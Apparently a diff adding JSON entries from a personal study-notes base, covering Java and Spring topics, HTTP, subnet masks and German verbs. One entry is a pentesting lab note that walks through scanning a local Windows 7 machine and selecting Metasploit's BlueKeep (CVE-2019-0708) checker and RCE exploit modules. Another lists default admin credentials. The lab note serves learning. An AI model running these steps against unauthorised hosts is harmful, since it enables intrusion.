+      "id": "Проэкт группы",
+      "title": "Проэкт группы",
+      "content": "1   -----------\n2   Связи: [[IT management]] \n3   Теги: [[IT management]] [[Проэкт группы]]\n\nссылка на проэкт \nhttps://docs.google.com/spreadsheets/d/1C3anGwlquP8YiouPEa9P03IJ-QJ2FeRjFHKk5Y_wZpw/edit#gid=312005060",
+      "full_content": "1   -----------\n2   Связи: [[IT management]] \n3   Теги: [[IT management]] [[Проэкт группы]]\n\nссылка на проэкт \nhttps://docs.google.com/spreadsheets/d/1C3anGwlquP8YiouPEa9P03IJ-QJ2FeRjFHKk5Y_wZpw/edit#gid=312005060",
+      "category": "other",
+      "tags": [
+        "management",
+        "edit",
+        "группы",
+        "проэкт",
+        "spreadsheets"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 34095
+    },
+    {
+      "id": "артефакт",
+      "title": "артефакт",
+      "content": "1   -----------\n2   Связи: [[сборщик проекта]]\n3   Теги:",
+      "full_content": "1   -----------\n2   Связи: [[сборщик проекта]]\n3   Теги:",
+      "category": "other",
+      "tags": [
+        "теги",
+        "проекта",
+        "связи",
+        "сборщик"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 26361
+    },
+    {
+      "id": "вразливість Windows--- Bluekeep and EnternalBlue",
+      "title": "вразливість Windows--- Bluekeep and EnternalBlue",
+      "content": "---\ntitle: \"вразливість Windows--- Bluekeep and EnternalBlue\"\ncategory: \"pentesting\"\ntags: ['blue', 'експлойт', 'eternalblue', 'вразливість', 'attack']\nstatus: \"published\"\ncreated: \"2026-03-24\"\nupdated: \"2026-03-24\"\nai-processed: false\nsource: \"manual\"\nquality: 1\nrelated-files: []\n---\n\n﻿1  ----------\n2 Звязки :  [[вразливості Windows]] , [[Eternal Blue Attack  (eternalblue)]], [[Double pulsar Attack -експлойт Windows]]\n3 Теги : [[вразливість Windows--- Bluekeep and EnternalBlue]]\nпоявилась вразливість в 2019 році\n\nце вразливість протоколу робочого стола RDP -\nдає можливість запускати код навіть без автоінтефікації \nцілями є машини з ос до віндовс7\nвикористовує порт **3389** він використовується на корпоративних машинах ф тут його потрібно включити. \n## включити порт 3389\nякщо провести [[сканування]] портів машини віндовс :\nsudo [[nmap]] -sS 192.168.1.77 \nто порт 3389 не знаходжу\nдля вивчення атаки я мушу відкрити цей порт на працюючій машині віндовс7:\n- заходжу на робочий стіл і відкриваю вкладку System and Security  -> System -> Remote setings (налаштування віддаленого доступу)\nя не можу включити порт. можливо закрита можливість, бо компютер домашній, а цей порт використовується в корпоративних версіях\nякщо найду відкритий порт то продовжую:\n-заходжу в термінал метасполоіта в іншомму терміналі:\nmsfconsole\nі взнаємо чи має вразливість ціль не використовуючи її (ми вводимо назву експлойту який буде використовувати оболонку інтерпретатора):\nsearch blukeep\nі отримую **допоміжний модуль** :\n 0 auxiliary/scanner/rdp/cve_2019_0708_bluekeep                        2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check\nі **експлоіт** : \n 3   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                      2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free\n-насамперед використовуємо допоміжний модуль:\nuse auxiliary/scanner/rdp/cve_2019_0708_bluekeep \nдивимось інформацію :\nshow info\nдивлюся варіанти:\nshow options\nустановлюю RHOSTS\nset RHOSTS 192.168.1.89\n і запускаю:\n run\n бачимо що ціль вразлива( в мене не получилось бо не так налаштована віндовс)\n тоді можна використати експлоіт для отримання доступу до цілі.:\n use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n\n\n\nкіно тут:\nhttps://www.youtube.com/watch?v=XQ0CL3LJ29E&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=57",
+      "full_content": "---\ntitle: \"вразливість Windows--- Bluekeep and EnternalBlue\"\ncategory: \"pentesting\"\ntags: ['blue', 'експлойт', 'eternalblue', 'вразливість', 'attack']\nstatus: \"published\"\ncreated: \"2026-03-24\"\nupdated: \"2026-03-24\"\nai-processed: false\nsource: \"manual\"\nquality: 1\nrelated-files: []\n---\n\n﻿1  ----------\n2 Звязки :  [[вразливості Windows]] , [[Eternal Blue Attack  (eternalblue)]], [[Double pulsar Attack -експлойт Windows]]\n3 Теги : [[вразливість Windows--- Bluekeep and EnternalBlue]]\nпоявилась вразливість в 2019 році\n\nце вразливість протоколу робочого стола RDP -\nдає можливість запускати код навіть без автоінтефікації \nцілями є машини з ос до віндовс7\nвикористовує порт **3389** він використовується на корпоративних машинах ф тут його потрібно включити. \n## включити порт 3389\nякщо провести [[сканування]] портів машини віндовс :\nsudo [[nmap]] -sS 192.168.1.77 \nто порт 3389 не знаходжу\nдля вивчення атаки я мушу відкрити цей порт на працюючій машині віндовс7:\n- заходжу на робочий стіл і відкриваю вкладку System and Security  -> System -> Remote setings (налаштування віддаленого доступу)\nя не можу включити порт. можливо закрита можливість, бо компютер домашній, а цей порт використовується в корпоративних версіях\nякщо найду відкритий порт то продовжую:\n-заходжу в термінал метасполоіта в іншомму терміналі:\nmsfconsole\nі взнаємо чи має вразливість ціль не використовуючи її (ми вводимо назву експлойту який буде використовувати оболонку інтерпретатора):\nsearch blukeep\nі отримую **допоміжний модуль** :\n 0 auxiliary/scanner/rdp/cve_2019_0708_bluekeep                        2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check\nі **експлоіт** : \n 3   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                      2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free\n-насамперед використовуємо допоміжний модуль:\nuse auxiliary/scanner/rdp/cve_2019_0708_bluekeep \nдивимось інформацію :\nshow info\nдивлюся варіанти:\nshow options\nустановлюю RHOSTS\nset RHOSTS 192.168.1.89\n і запускаю:\n run\n бачимо що ціль вразлива( в мене не получилось бо не так налаштована віндовс)\n тоді можна використати експлоіт для отримання доступу до цілі.:\n use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n\n\n\nкіно тут:\nhttps://www.youtube.com/watch?v=XQ0CL3LJ29E&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=57",
+      "category": "other",
+      "tags": [],
+      "status": "published",
+      "created": "",
+      "updated": "",
+      "quality": 3,
+      "embedding_hash": 19454
+    },
+    {
+      "id": "генератор зображення",
+      "title": "генератор зображення",
+      "content": "﻿\n1   -----------\n2   Связи: искусственный интелект \n3   Теги: ии искусственный интелект рисовать картинки \n\n###  SD3 medium",
+      "full_content": "﻿\n1   -----------\n2   Связи: искусственный интелект \n3   Теги: ии искусственный интелект рисовать картинки \n\n###  SD3 medium",
+      "category": "other",
+      "tags": [
+        "искусственный",
+        "картинки",
+        "рисовать",
+        "теги",
+        "интелект"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 134840
+    },
+    {
+      "id": "джентельментські угоди",
+      "title": "джентельментські угоди",
+      "content": "1   -----------\n2   Связи:\n3   Теги:[[джентельментські угоди]]\n\n1.  текстове значення , яке ми записуємо або дописуємо кудись в файл  командою **echo**  завжди береться в подвійні лапки **\"    \"**\n\t**echo \" те що ми передаєм цією командою\"**\n2. **Змінні** за замовчуванням в системі пишуться **ВЕЛИКИМИ БУКВАМИ** \n\n3. Система не бачить розширеннь. Ми пишемо їх для того щоб ми і коллеги знали як працювакти з файлом. не використовувати спецсимволи в назвах папок і файлів. \n\n## Інформація про операційну систему знаходиться по шляху:\n/etc/os-release \nі іі можна подивитися командою **cat**\ncat /etc/os-release",
+      "full_content": "1   -----------\n2   Связи:\n3   Теги:[[джентельментські угоди]]\n\n1.  текстове значення , яке ми записуємо або дописуємо кудись в файл  командою **echo**  завжди береться в подвійні лапки **\"    \"**\n\t**echo \" те що ми передаєм цією командою\"**\n2. **Змінні** за замовчуванням в системі пишуться **ВЕЛИКИМИ БУКВАМИ** \n\n3. Система не бачить розширеннь. Ми пишемо їх для того щоб ми і коллеги знали як працювакти з файлом. не використовувати спецсимволи в назвах папок і файлів. \n\n## Інформація про операційну систему знаходиться по шляху:\n/etc/os-release \nі іі можна подивитися командою **cat**\ncat /etc/os-release",
+      "category": "other",
+      "tags": [
+        "береться",
+        "дописуємо",
+        "подвійні",
+        "лапки",
+        "завжди"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 62505
+    },
+    {
+      "id": "информация для входа",
+      "title": "информация для входа",
+      "content": "﻿\n1   -----------\n2   Связи: [[Мой проект индивидуальный]]\n3   Теги: информация для входа\n\n\n### 3. Ключевая информация для входа\n\nТеперь вы можете использовать следующие данные для входа в ваше приложение:\n\n#### Администратор:\n\n- **Имя пользователя:** admin\n- **Пароль:** adminpassword\n- **Роль:** ADMIN\n\n#### Обычный пользователь:\n\n- **Имя пользователя:** user\n- **Пароль:** userpassword\n- **Роль:** TRIAL",
+      "full_content": "﻿\n1   -----------\n2   Связи: [[Мой проект индивидуальный]]\n3   Теги: информация для входа\n\n\n### 3. Ключевая информация для входа\n\nТеперь вы можете использовать следующие данные для входа в ваше приложение:\n\n#### Администратор:\n\n- **Имя пользователя:** admin\n- **Пароль:** adminpassword\n- **Роль:** ADMIN\n\n#### Обычный пользователь:\n\n- **Имя пользователя:** user\n- **Пароль:** userpassword\n- **Роль:** TRIAL",
+      "category": "other",
+      "tags": [
+        "ваше",
+        "следующие",
+        "данные",
+        "входа",
+        "использовать"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 122365
+    },
+    {
+      "id": "номера масок до 30",
+      "title": "номера масок до 30",
+      "content": "|   |   |   |\n|---|---|---|\n|`/10`|`255.192.0.0`|`11111111.11000000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/11`|`255.224.0.0`|`11111111.11100000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/12`|`255.240.0.0`|`11111111.11110000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/13`|`255.248.0.0`|`11111111.11111000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/14`|`255.252.0.0`|`11111111.11111100.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/15`|`255.254.0.0`|`11111111.11111110.00000000.00000000`|\n\n|   |   |\n|---|---|\n|`/16`|`255.255.0.0`|",
+      "full_content": "|   |   |   |\n|---|---|---|\n|`/10`|`255.192.0.0`|`11111111.11000000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/11`|`255.224.0.0`|`11111111.11100000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/12`|`255.240.0.0`|`11111111.11110000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/13`|`255.248.0.0`|`11111111.11111000.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/14`|`255.252.0.0`|`11111111.11111100.00000000.00000000`|\n\n|   |   |   |\n|---|---|---|\n|`/15`|`255.254.0.0`|`11111111.11111110.00000000.00000000`|\n\n|   |   |\n|---|---|\n|`/16`|`255.255.0.0`|",
+      "category": "other",
+      "tags": [
+        "general"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 5799
+    },
+    {
+      "id": "ответ",
+      "title": "ответ",
+      "content": "﻿\n1   -----------\n2   Связи:[[HTTP]] сервер  клиент [[запрос]] [[ответ]]\n3   Теги:\n\nсервер программа которая может получить [[запрос]] и отправить **ответ** // В качестве **сервера** выступает некий  **веб-сервер** который умеет отвечать на запросы\nв проэкте сервером выступает **джарник** который умеет отвечать на запросы со стороны браузера \nв этом случае на моем компютере поднимается **томкат** сервис и мой комп становится сервером\n## ответ\nв первом рядке ответа идет информация об версии НТТР , код состояния и опись состояния\n{версии НТТР } {код состояния } {опись состояния } \n[[HTTP]]/1.1 200 OK\nServer : Apache\nContent-Type : text/html; .................\nContent- Length : 1234\nbody answer.(тело ответа)",
+      "full_content": "﻿\n1   -----------\n2   Связи:[[HTTP]] сервер  клиент [[запрос]] [[ответ]]\n3   Теги:\n\nсервер программа которая может получить [[запрос]] и отправить **ответ** // В качестве **сервера** выступает некий  **веб-сервер** который умеет отвечать на запросы\nв проэкте сервером выступает **джарник** который умеет отвечать на запросы со стороны браузера \nв этом случае на моем компютере поднимается **томкат** сервис и мой комп становится сервером\n## ответ\nв первом рядке ответа идет информация об версии НТТР , код состояния и опись состояния\n{версии НТТР } {код состояния } {опись состояния } \n[[HTTP]]/1.1 200 OK\nServer : Apache\nContent-Type : text/html; .................\nContent- Length : 1234\nbody answer.(тело ответа)",
+      "category": "other",
+      "tags": [
+        "которая",
+        "клиент",
+        "некий",
+        "отвечать",
+        "сервер"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 118814
+    },
+    {
+      "id": "подключение баз данных",
+      "title": "подключение баз данных",
+      "content": "---\ntitle: \"------- ---\"\ncategory: \"networking\"\ntags: ['клиент', 'подключение', 'проэкт', 'репозиторий', 'создание']\nstatus: \"published\"\ncreated: \"2026-03-24\"\nupdated: \"2026-03-24\"\nai-processed: false\nsource: \"manual\"\nquality: 1\nrelated-files: []\n---\n\n﻿1   -----------\n2   Связи:[[HTTP]] сервер  клиент [[запрос]] [[ответ]] [[проэкт на spring bot]] \n[[Репозиторий repository java]]  [[создание связей]] [[подключение баз данных]]  [[конфигурационные файлы бины]] [[тестирование проэкта]] \n[[проэкт на spring bot]]  [[Unit тесты Junit тесты]]\n3   Теги: \n[[Репозиторий repository java]] #подключение_баз_данных \n\n\nза подключение  к **базам данных** отвечает **JDBC** driver manager\n## **JDBC** driver manager\nYDBC - java database Conektivity\n\n###  он управляет\n- подключение к базе данных\n- выдачу запросов и команд\n- обработкой и получением данных из базы\n\n**DriverManager**  это синглтон содержащий информацию о всех зарегестрированых драйверах\n\n**JDBC**  имеет три основных [[интерфейса]] \n-   **CONNECTION** подключение к базе данных\n-  **STATEMENT** выдачу запросов и команд\n-  **ResultSet** обработкой и получением данных из базы\nэти соединения **нужно** закрывать. можно использовать **try with recours**ed \n\n\n\n\n\n\n\n\n\n\n\nподключение к консоли\n[[HTTP]]://localhost:8081/h2-console\n\n\n\n## --- H2 ---\n[[Spring]].datasource.url=jdbc:h2:mem:dev\n#spring.datasource.url=jdbc:h2:file:D:/java/h2/dev\nspring.datasource.driverClassName=org.h2.Driver\nspring.datasource.username=sa\nspring.datasource.password=sa\nspring.[[JPA]].database-platform=org.hibernate.dialect.H2Dialect\nspring.jpa.hibernate.ddl-auto=update\nspring.jpa.show-sql=true\nspring.jpa.hibernate.naming.physical-strategy=org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl\n\nspring.h2.console.enabled=true\nspring.h2.console.path=/h2-console\nspring.h2.console.settings.trace=false\nspring.h2.console.settings.web-allow-others=false\n# ------- ---\n\n\n",
+      "full_content": "---\ntitle: \"------- ---\"\ncategory: \"networking\"\ntags: ['клиент', 'подключение', 'проэкт', 'репозиторий', 'создание']\nstatus: \"published\"\ncreated: \"2026-03-24\"\nupdated: \"2026-03-24\"\nai-processed: false\nsource: \"manual\"\nquality: 1\nrelated-files: []\n---\n\n﻿1   -----------\n2   Связи:[[HTTP]] сервер  клиент [[запрос]] [[ответ]] [[проэкт на spring bot]] \n[[Репозиторий repository java]]  [[создание связей]] [[подключение баз данных]]  [[конфигурационные файлы бины]] [[тестирование проэкта]] \n[[проэкт на spring bot]]  [[Unit тесты Junit тесты]]\n3   Теги: \n[[Репозиторий repository java]] #подключение_баз_данных \n\n\nза подключение  к **базам данных** отвечает **JDBC** driver manager\n## **JDBC** driver manager\nYDBC - java database Conektivity\n\n###  он управляет\n- подключение к базе данных\n- выдачу запросов и команд\n- обработкой и получением данных из базы\n\n**DriverManager**  это синглтон содержащий информацию о всех зарегестрированых драйверах\n\n**JDBC**  имеет три основных [[интерфейса]] \n-   **CONNECTION** подключение к базе данных\n-  **STATEMENT** выдачу запросов и команд\n-  **ResultSet** обработкой и получением данных из базы\nэти соединения **нужно** закрывать. можно использовать **try with recours**ed \n\n\n\n\n\n\n\n\n\n\n\nподключение к консоли\n[[HTTP]]://localhost:8081/h2-console\n\n\n\n## --- H2 ---\n[[Spring]].datasource.url=jdbc:h2:mem:dev\n#spring.datasource.url=jdbc:h2:file:D:/java/h2/dev\nspring.datasource.driverClassName=org.h2.Driver\nspring.datasource.username=sa\nspring.datasource.password=sa\nspring.[[JPA]].database-platform=org.hibernate.dialect.H2Dialect\nspring.jpa.hibernate.ddl-auto=update\nspring.jpa.show-sql=true\nspring.jpa.hibernate.naming.physical-strategy=org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl\n\nspring.h2.console.enabled=true\nspring.h2.console.path=/h2-console\nspring.h2.console.settings.trace=false\nspring.h2.console.settings.web-allow-others=false\n# ------- ---\n\n\n",
+      "category": "other",
+      "tags": [],
+      "status": "published",
+      "created": "",
+      "updated": "",
+      "quality": 3,
+      "embedding_hash": 39302
+    },
+    {
+      "id": "пулы потоков",
+      "title": "пулы потоков",
+      "content": "﻿\n1   -----------\n2   Связи: [[поток]]   [[синхронизация  Synchroniz]] [[многопоточность]] [[StringBuffer, StringBuilder стрингбилдер стрингбуфер]]\n3   Теги: [[пулы потоков]] потокобезопасный\n\n[[пулы потоков]] это совокупность потоков для выполнения тех или иных нужд \n\n1. создается просто руками [[поток]] и потом запускается\n2 . создается пул потоков а дальше в пул потоков передаются задачи\n\n**При** **этом**  джава не создает каждый раз новый поток, а использует созданные для выполнения задач\n\nпосле выполнения потока он не завершается а ждет постановки следующей задачи, возвращаясь в исходную точку и начинает ждать следующую задачу.\nКогда задачи заканчиваются потоки в исходном состоянии могут быть закрыты\n\n**Основная** задача пулы потоковв это экономия ресурсов \n\nпотоки создаются через два класса или статические методы класса Exsecutor\n1. ExecutorService executorService;\n2. ShedExecutorServise",
+      "full_content": "﻿\n1   -----------\n2   Связи: [[поток]]   [[синхронизация  Synchroniz]] [[многопоточность]] [[StringBuffer, StringBuilder стрингбилдер стрингбуфер]]\n3   Теги: [[пулы потоков]] потокобезопасный\n\n[[пулы потоков]] это совокупность потоков для выполнения тех или иных нужд \n\n1. создается просто руками [[поток]] и потом запускается\n2 . создается пул потоков а дальше в пул потоков передаются задачи\n\n**При** **этом**  джава не создает каждый раз новый поток, а использует созданные для выполнения задач\n\nпосле выполнения потока он не завершается а ждет постановки следующей задачи, возвращаясь в исходную точку и начинает ждать следующую задачу.\nКогда задачи заканчиваются потоки в исходном состоянии могут быть закрыты\n\n**Основная** задача пулы потоковв это экономия ресурсов \n\nпотоки создаются через два класса или статические методы класса Exsecutor\n1. ExecutorService executorService;\n2. ShedExecutorServise",
+      "category": "other",
+      "tags": [
+        "пулы",
+        "синхронизация",
+        "synchroniz",
+        "стрингбуфер",
+        "выполнения"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 110709
+    },
+    {
+      "id": "сервисы AI",
+      "title": "сервисы AI",
+      "content": "﻿\n\n\nосновы \n\nнейросети имитируют работу мозга, построены на графах(нейроны и связи между ними)\n\n\n *дата сет* временной ряд дают инфу **равними** промежутками\n применяется в обученнии нейросети\nдата сет это основа обучения, очень дороги\n\nТипы нейросетей\n1 Сверточные нейр сетиCNN [] соцсети\n\n\n2 Рекуррентные PNN  анализ последования данных **Контекст**\n\n3 Трансформеры  анализ и *генерация* \n\n\n1   -----------\n2   Связи: базы данных [[ GPT]]\n3   Теги: [[GPT]]",
+      "full_content": "﻿\n\n\nосновы \n\nнейросети имитируют работу мозга, построены на графах(нейроны и связи между ними)\n\n\n *дата сет* временной ряд дают инфу **равними** промежутками\n применяется в обученнии нейросети\nдата сет это основа обучения, очень дороги\n\nТипы нейросетей\n1 Сверточные нейр сетиCNN [] соцсети\n\n\n2 Рекуррентные PNN  анализ последования данных **Контекст**\n\n3 Трансформеры  анализ и *генерация* \n\n\n1   -----------\n2   Связи: базы данных [[ GPT]]\n3   Теги: [[GPT]]",
+      "category": "other",
+      "tags": [
+        "инфу",
+        "графах",
+        "применяется",
+        "нейроны",
+        "обучения"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 147216
+    },
+    {
+      "id": "слабкі дієслова 1 групи schwache werbung",
+      "title": "слабкі дієслова 1 групи schwache werbung",
+      "content": "﻿1   -----------\n2   Связи: [[Verben дієслово]]  ]\n3   Теги: [[сильні дієслова starke werbung]] слабкі дієслова 3 групи schwache werbung  [[слабкі дієслова 2 групи schwache werbung]]\n\n| **Дієслово**    | **Переклад**        | **Präsens (Теперішній час)** | **Präteritum (Минулий час)** | **Partizip II (Партицип II)** | **Доп. інформація**            |\n| --------------- | ------------------- | ---------------------------- | ---------------------------- | ----------------------------- | ------------------------------ |\n| **kaufen**      | купувати            | ich **kaufe**                | ich **kaufte**               | ich habe **gekauft**          | Слабке дієслово                |\n| **arbeiten**    | працювати           | ich **arbeite**              | ich **arbeitete**            | ich habe **gearbeitet**       | Дод. -et через складну вимову  |\n| **machen**      | робити              | ich **mache**                | ich **machte**               | ich habe **gemacht**          | Слабке дієслово                |\n| **frühstücken** | снідати             | ich **frühstücke**           | ich **frühstückte**          | ich habe **gefrühstückt**     | Умляут через слово \"Frühstück\" |\n| **hören**       | слухати             | ich **höre**                 | ich **hörte**                | ich habe **gehört**           | Слабке дієслово, умляут        |\n| **putzen**      | чистити             | ich **putze**                | ich **putzte**               | ich habe **geputzt**          | Слабке дієслово                |\n| **kochen**      | готувати            | ich **koche**                | ich **kochte**               | ich habe **gekocht**          | Слабке дієслово                |\n| **spielen**     | грати               | ich **spiele**               | ich **spielte**              | ich habe **gespielt**         | Слабке дієслово                |\n| **tanzen**      | танцювати           | ich **tanze**                | ich **tanzte**               | ich habe **getanzt**          | Слабке дієслово                |\n| **klettern**    | лазити, підійматися | ich **klettere**             | ich **kletterte**            | ich bin **geklettert**        | Використовується з **sein**    |\n| **lernen**      | вчитися             | ich **lerne**                | ich **lernte**               | ich habe **gelernt**          | Слабке дієслово                |\n| **lachen**      | сміятися            | ich **lache**                | ich **lachte**               | ich habe **gelacht**          | Слабке дієслово                |\n| **fragen**      | запитувати          | ich **frage**                | ich **fragte**               | ich habe **gefragt**          | Слабке дієслово                |\n| **lieben**      | любити              | ich **liebe**                | ich **liebte**               | ich habe **geliebt**          | Слабке дієслово                |\n| **reisen**      | подорожувати        | ich **reise**                | ich **reiste**               | ich bin **gereist**           | Використовується з **sein**    |\n| **wohnen**      | жити                | ich **wohne**                | ich **wohnte**               | ich habe **gewohnt**          |  Слабке дієслово               |\n|                 |                     |                              |                              |                               |                                |\n|                 |                     |                              |                              |                               |                                |",
+      "full_content": "﻿1   -----------\n2   Связи: [[Verben дієслово]]  ]\n3   Теги: [[сильні дієслова starke werbung]] слабкі дієслова 3 групи schwache werbung  [[слабкі дієслова 2 групи schwache werbung]]\n\n| **Дієслово**    | **Переклад**        | **Präsens (Теперішній час)** | **Präteritum (Минулий час)** | **Partizip II (Партицип II)** | **Доп. інформація**            |\n| --------------- | ------------------- | ---------------------------- | ---------------------------- | ----------------------------- | ------------------------------ |\n| **kaufen**      | купувати            | ich **kaufe**                | ich **kaufte**               | ich habe **gekauft**          | Слабке дієслово                |\n| **arbeiten**    | працювати           | ich **arbeite**              | ich **arbeitete**            | ich habe **gearbeitet**       | Дод. -et через складну вимову  |\n| **machen**      | робити              | ich **mache**                | ich **machte**               | ich habe **gemacht**          | Слабке дієслово                |\n| **frühstücken** | снідати             | ich **frühstücke**           | ich **frühstückte**          | ich habe **gefrühstückt**     | Умляут через слово \"Frühstück\" |\n| **hören**       | слухати             | ich **höre**                 | ich **hörte**                | ich habe **gehört**           | Слабке дієслово, умляут        |\n| **putzen**      | чистити             | ich **putze**                | ich **putzte**               | ich habe **geputzt**          | Слабке дієслово                |\n| **kochen**      | готувати            | ich **koche**                | ich **kochte**               | ich habe **gekocht**          | Слабке дієслово                |\n| **spielen**     | грати               | ich **spiele**               | ich **spielte**              | ich habe **gespielt**         | Слабке дієслово                |\n| **tanzen**      | танцювати           | ich **tanze**                | ich **tanzte**               | ich habe **getanzt**          | Слабке дієслово                |\n| **klettern**    | лазити, підійматися | ich **klettere**             | ich **kletterte**            | ich bin **geklettert**        | Використовується з **sein**    |\n| **lernen**      | вчитися             | ich **lerne**                | ich **lernte**               | ich habe **gelernt**          | Слабке дієслово                |\n| **lachen**      | сміятися            | ich **lache**                | ich **lachte**               | ich habe **gelacht**          | Слабке дієслово                |\n| **fragen**      | запитувати          | ich **frage**                | ich **fragte**               | ich habe **gefragt**          | Слабке дієслово                |\n| **lieben**      | любити              | ich **liebe**                | ich **liebte**               | ich habe **geliebt**          | Слабке дієслово                |\n| **reisen**      | подорожувати        | ich **reise**                | ich **reiste**               | ich bin **gereist**           | Використовується з **sein**    |\n| **wohnen**      | жити                | ich **wohne**                | ich **wohnte**               | ich habe **gewohnt**          |  Слабке дієслово               |\n|                 |                     |                              |                              |                               |                                |\n|                 |                     |                              |                              |                               |                                |",
+      "category": "other",
+      "tags": [
+        "переклад",
+        "слабкі",
+        "партицип",
+        "дієслово",
+        "starke"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 107444
+    },
+    {
+      "id": "слабкі дієслова 2 групи schwache werbung",
+      "title": "Слабкі дієслова в німецькій мові 2 група",
+      "content": "﻿1   -----------\n2   Связи: [[Verben дієслово]]  \n3   Теги: [[сильні дієслова starke werbung]]  , [[слабкі дієслова 1 групи schwache werbung]], [[слабкі дієслова 2 групи schwache werbung]], слабкі дієслова 3 групи schwache werbung\n\n# Слабкі дієслова в німецькій мові 2 група\n\n## Визначення\n\nСлабкі дієслова ( **schwache Verben** ) у німецькій мові утворюють форми минулого часу (Präteritum) і партиципу II (Partizip II) через додавання суфіксів **-te** або **-t**, без зміни кореневої голосної. Ці дієслова є регулярними і мають однакові правила відмінювання.\n\n## Таблиця дієслів\n\n| **Дієслово**  | **Переклад**      | **Präsens**         | **Präteritum**        | **Partizip II**          | **Особливості**            |\n|---------------|-------------------|---------------------|-----------------------|--------------------------|----------------------------|\n| **haben**     | мати              | ich **habe**        | ich **hatte**         | ich habe **gehabt**      | Неправильне, часто вживається |\n| **bezahlen**  | оплачувати        | ich **bezahle**     | ich **bezahlte**      | ich habe **bezahlt**     | Регулярне слабке дієслово |\n| **benutzen**  | користуватися     | ich **benutze**     | ich **benutzte**      | ich habe **benutzt**     | Регулярне слабке дієслово |\n| **vergessen** | забувати          | ich **vergesse**    | ich **vergaß**        | ich habe **vergessen**   | Сильне дієслово            |\n| **reparieren**| ремонтувати       | ich **repariere**   | ich **reparierte**    | ich habe **repariert**   | Регулярне, інфінітив із -ieren |\n| **lernen**    | вчитися           | ich **lerne**       | ich **lernte**        | ich habe **gelernt**     | Регулярне слабке дієслово |\n| **spielen**   | грати             | ich **spiele**      | ich **spielte**       | ich habe **gespielt**    | Регулярне слабке дієслово |\n| **arbeiten**  | працювати         | ich **arbeite**     | ich **arbeitete**     | ich habe **gearbeitet**  | Суфікс **-et** через вимову |\n\n---\n\n### Як доповнити таблицю?\n\nЩоб додати нове дієслово:\n1. Дотримуйтесь формату таблиці.\n2. Вкажіть переклад, форми Präsens, Präteritum, і Partizip II.\n3. Додайте коротку примітку в колонку \"Особливості\".\n\n### Приклад:\n\nДодайте, наприклад, **wandern** (мандрівля):\n\n```markdown\n| **wandern**  | мандрувати         | ich **wandere**     | ich **wanderte**      | ich bin **gewandert**    | Використовується з **sein** |",
+      "full_content": "﻿1   -----------\n2   Связи: [[Verben дієслово]]  \n3   Теги: [[сильні дієслова starke werbung]]  , [[слабкі дієслова 1 групи schwache werbung]], [[слабкі дієслова 2 групи schwache werbung]], слабкі дієслова 3 групи schwache werbung\n\n# Слабкі дієслова в німецькій мові 2 група\n\n## Визначення\n\nСлабкі дієслова ( **schwache Verben** ) у німецькій мові утворюють форми минулого часу (Präteritum) і партиципу II (Partizip II) через додавання суфіксів **-te** або **-t**, без зміни кореневої голосної. Ці дієслова є регулярними і мають однакові правила відмінювання.\n\n## Таблиця дієслів\n\n| **Дієслово**  | **Переклад**      | **Präsens**         | **Präteritum**        | **Partizip II**          | **Особливості**            |\n|---------------|-------------------|---------------------|-----------------------|--------------------------|----------------------------|\n| **haben**     | мати              | ich **habe**        | ich **hatte**         | ich habe **gehabt**      | Неправильне, часто вживається |\n| **bezahlen**  | оплачувати        | ich **bezahle**     | ich **bezahlte**      | ich habe **bezahlt**     | Регулярне слабке дієслово |\n| **benutzen**  | користуватися     | ich **benutze**     | ich **benutzte**      | ich habe **benutzt**     | Регулярне слабке дієслово |\n| **vergessen** | забувати          | ich **vergesse**    | ich **vergaß**        | ich habe **vergessen**   | Сильне дієслово            |\n| **reparieren**| ремонтувати       | ich **repariere**   | ich **reparierte**    | ich habe **repariert**   | Регулярне, інфінітив із -ieren |\n| **lernen**    | вчитися           | ich **lerne**       | ich **lernte**        | ich habe **gelernt**     | Регулярне слабке дієслово |\n| **spielen**   | грати             | ich **spiele**      | ich **spielte**       | ich habe **gespielt**    | Регулярне слабке дієслово |\n| **arbeiten**  | працювати         | ich **arbeite**     | ich **arbeitete**     | ich habe **gearbeitet**  | Суфікс 